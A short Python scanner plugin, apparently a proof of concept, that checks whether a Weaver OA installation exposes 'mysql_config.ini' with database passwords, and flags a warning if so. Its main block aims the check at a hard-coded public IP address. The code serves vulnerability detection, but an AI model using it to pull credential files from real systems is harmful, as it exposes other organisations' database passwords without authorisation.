#!/usr/bin/python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2010-087500

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

def audit(url):
    url += 'mysql_config.ini'
    code, head,res, errcode, _ = curl.curl2(url)
    if 'datapassword' in res:
        security_warning(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])